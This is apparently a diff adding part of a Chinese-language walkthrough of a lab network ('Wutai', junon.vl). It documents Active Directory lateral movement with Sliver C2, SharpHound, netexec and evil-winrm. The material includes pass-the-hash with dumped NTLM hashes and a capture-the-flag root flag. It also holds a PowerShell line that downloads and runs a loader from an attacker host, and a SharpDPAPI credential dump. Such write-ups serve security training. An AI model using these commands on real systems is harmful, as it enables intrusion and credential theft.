@@ -1284,3 +1284,214 @@ Reconnect Interval: 1m0s
       Last Checkin: Sat Nov  4 07:11:06 EDT 2023 (1s ago)
 ```
 
+```bash
+[server] sliver (wutai-http) > execute-assembly -i -s /home/kali/Downloads/SharpHound.exe -- -c all,gpolocalgroup -d eu.junon.vl
+
+[server] sliver (wutai-http) > download 20231104105301_wjus0f4t.rzt.zip
+```
+
+```
+查看
+S021M200.EU.JUNON.VL EU的DC 172.16.21.222
+S021M215 域内机器 172.16.21.223
+```
+
+```bash
+proxychains4 -q nmap -Pn -sT -v -T4 -p 22,80,443,135,445,5985,3389 172.16.21.223
+
+3389
+5985
+```
+
+```bash
+ proxychains4 -q ./nxc smb 172.16.21.222 -d work.junon.vl -u melanie.mueller -p Summer2023 --shares
+SMB         172.16.21.222   445    S021M200         [*] Windows 10.0 Build 20348 x64 (name:S021M200) (domain:work.junon.vl) (signing:True) (SMBv1:False)
+SMB         172.16.21.222   445    S021M200         [+] work.junon.vl\melanie.mueller:Summer2023
+SMB         172.16.21.222   445    S021M200         [*] Enumerated shares
+SMB         172.16.21.222   445    S021M200         Share           Permissions     Remark
+SMB         172.16.21.222   445    S021M200         -----           -----------     ------
+SMB         172.16.21.222   445    S021M200         ADMIN$                          Remote Admin
+SMB         172.16.21.222   445    S021M200         C$                              Default share
+SMB         172.16.21.222   445    S021M200         CertEnroll      READ            Active Directory Certificate Services share
+SMB         172.16.21.222   445    S021M200         IPC$            READ            Remote IPC
+SMB         172.16.21.222   445    S021M200         NETLOGON        READ            Logon server share
+SMB         172.16.21.222   445    S021M200         SYSVOL          READ            Logon server share
+```
+
+```
+ADCS
+```
+
+```bash
+cat work_junon.hashes.ntds|cut -d ":" -f1|grep work.junon.vl|cut -d '\' -f2|tee users_work.txt
+
+junon.vl 采用了分层管理模型
+
+[server] sliver (wutai-http) > sharpview -t 500 -- Get-DomainUser -Domain eu.junon.vl -Properties samaccountname
+
+cat eu.sharpview|cut -d ":" -f2|cut -d " " -f2|awk 'NF'|tee users_eu.txt
+
+while read -r line; do grep -qF "$line" work_junon.hashes.ntds && echo "$line"; done < users_eu.txt
+Administrator
+Guest
+krbtgt
+Garry.Smith
+sa-kmorris
+```
+
+```bash
+Garry.Smith 4ed87458bfd1166a398ebad53d6935fe
+sa-kmorris  4fd64fa379181761b526f77ce577b5ac
+
+proxychains4 -q ./nxc smb 172.16.21.222 -d eu.junon.vl -u Garry.Smith -H 4ed87458bfd1166a398ebad53d6935fe
+SMB         172.16.21.222   445    S021M200         [*] Windows 10.0 Build 20348 x64 (name:S021M200) (domain:eu.junon.vl) (signing:True) (SMBv1:False)
+SMB         172.16.21.222   445    S021M200         [-] eu.junon.vl\Garry.Smith:4ed87458bfd1166a398ebad53d6935fe STATUS_LOGON_FAILURE
+
+Garry.Smith身份验证失败
+
+proxychains4 -q ./nxc smb 172.16.21.222 -d eu.junon.vl -u sa-kmorris -H 4fd64fa379181761b526f77ce577b5ac
+
+sa-kmorris 依然身份验证失败
+```
+```
+cat users_eu.txt|grep sa
+Teresa.Shah
+Teresa.Begum
+sa-kmorris
+
+sa-kyoung
+sa-dwest
+
+cat users_work.txt|grep -i west
+Dale.West
+
+work.junon.vl\Dale.West:1405:aad3b435b51404eeaad3b435b51404ee:fa277a017b90f30048992530d3f9b75f:::
+
+
+sa-dwest
+fa277a017b90f30048992530d3f9b75f
+
+```
+
+成功通过了域身份验证
+```bash
+proxychains4 -q ./nxc smb 172.16.21.222 -d eu.junon.vl -u sa-dwest -H fa277a017b90f30048992530d3f9b75f
+SMB         172.16.21.222   445    S021M200         [*] Windows 10.0 Build 20348 x64 (name:S021M200) (domain:eu.junon.vl) (signing:True) (SMBv1:False)
+SMB         172.16.21.222   445    S021M200         [+] eu.junon.vl\sa-dwest:fa277a017b90f30048992530d3f9b75f
+
+```
+
+winrm
+```bash
+proxychains4 -q evil-winrm -u sa-dwest -i 172.16.21.223 -H fa277a017b90f30048992530d3f9b75f
+
+*Evil-WinRM* PS C:\Users\sa-dwest\Documents> whoami
+eu-junon\sa-dwest
+```
+
+```powershell
+*Evil-WinRM* PS C:\Users\sa-dwest\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name         SID
+================= =============================================
+eu-junon\sa-dwest S-1-5-21-2634976785-1424521755-791916841-1313
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID                                           Attributes
+==================================== ================ ============================================= ===============================================================
+Everyone                             Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators               Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
+NT AUTHORITY\NETWORK                 Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+EU-JUNON\ServerAdmins                Group            S-1-5-21-2634976785-1424521755-791916841-1306 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+```
+
+```powershell
+*Evil-WinRM* PS C:\Users\sa-dwest\Documents> cd C:\Users\administrator\Desktop\
+*Evil-WinRM* PS C:\Users\administrator\Desktop> dir
+
+
+    Directory: C:\Users\administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         3/28/2023   1:33 PM             36 root.txt
+
+
+*Evil-WinRM* PS C:\Users\administrator\Desktop> type root.txt
+VL{591eca30daceb53f980e6f25314ad7c3}
+```
+
+Beacon
+
+```bash
+*Evil-WinRM* PS C:\Windows\Tasks> iwr http://10.8.0.227:8000/Loaders.exe -usebasicparsing -outfile fsociety.exe
+
+*Evil-WinRM* PS C:\Windows\Tasks> .\fsociety.exe
+```
+
+![](/assets/post_img/2023-11-05%2006012_Wutai_S021M215.png)
+
+sharpdpapi
+
+```bash
+TaskScheduler
+UserName         : EU-JUNON\svc_backup
+Credential       : b4ckup5821!
+```
+
+```
+Reachable High Value Targets	19
+```
+![](/assets/post_img/2023-11-05%20060809_svc_backup_Reachable_High_Value_Targets.png)
+
